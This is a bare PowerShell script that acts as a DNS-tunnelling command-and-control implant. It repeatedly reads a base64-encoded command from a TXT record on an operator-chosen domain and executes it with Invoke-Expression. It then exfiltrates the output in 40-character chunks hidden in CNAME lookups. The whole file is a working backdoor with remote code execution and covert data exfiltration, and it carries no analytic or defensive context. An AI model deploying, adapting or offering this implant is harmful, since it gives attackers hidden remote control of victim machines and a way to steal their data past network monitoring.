$domain = "your_domain.co.il" #Put in here you Domain Name

function Send-CnameQuery {
    param (
        [string]$data
    )
    try {
        nslookup -type=CNAME "$data.$domain" | Out-Null
        Write-Output "Sent CNAME query: $data"
    } catch {
        Write-Output "Failed to send CNAME query: $_"
    }
}

while ($true) {
    try {
        Write-Output "Querying TXT record..."
        $txtOutput = nslookup -type=TXT $domain | Out-String
        if ($txtOutput -match 'text\s*=\s*"(.*?)"') {
            $encodedCommand = $matches[1]
            $decodedCommand = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($encodedCommand))
            Write-Output "Received Base64 command: $encodedCommand"
            Write-Output "Decoded command: $decodedCommand"

            Write-Output "Executing command..."
            $commandOutput = Invoke-Expression $decodedCommand 2>&1
            Write-Output "Command output: $commandOutput"

            $uniqueId = (Get-Date).ToString("yyyyMMddHHmmss")
            $encodedOutput = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($uniqueId + "|" + $commandOutput))

            # Limit Base64 chunks to 40 characters
            $chunks = $encodedOutput -split "(.{1,40})" | Where-Object { $_ -ne "" }
            $chunkCount = $chunks.Count

            Send-CnameQuery "$uniqueId-start"
            Start-Sleep -Milliseconds 500
            Send-CnameQuery "$uniqueId-$chunkCount-chunks"
            Start-Sleep -Milliseconds 500

            $chunkIndex = 1
            foreach ($chunk in $chunks) {
                # Ensure each label (chunk) does not exceed 63 characters
                if (($chunk.Length + $uniqueId.Length + 10) -gt 63) {
                    $chunk = $chunk.Substring(0, 40) # Shorten chunk if needed
                }
                Send-CnameQuery "$uniqueId-chunk$chunkIndex-$chunk"
                Start-Sleep -Milliseconds 3000
                $chunkIndex++
            }

            Send-CnameQuery "$uniqueId-end"
        } else {
            Write-Output "No TXT record found for command."
        }
    } catch {
        Write-Output "An error occurred: $_"
    }
    Start-Sleep -Seconds 25
}

